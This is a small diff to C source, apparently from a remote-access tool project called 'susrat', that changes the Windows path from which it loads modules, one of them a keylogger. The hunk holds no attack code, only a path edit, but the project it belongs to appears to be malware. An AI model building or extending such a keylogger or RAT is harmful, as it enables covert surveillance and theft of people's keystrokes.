@@ -31,7 +31,7 @@ load_all_modules(char *mods[], char *mod_path) {
 int main(void) {
 
 #ifdef _WIN32
-	char *mod_path = "C:/Users/חופשי/Source/Repos/susrat/modules/KeyLogger/Debug/";
+	char *mod_path = "C:\\Users\\חופשי\\Documents\\Visual Studio 2017\\Projects\\susrat\\modules\\KeyLogger\\Debug\\";
 #else
 #ifdef linux
 	char *mod_path = "/home/venus/projects/rat/modules/";
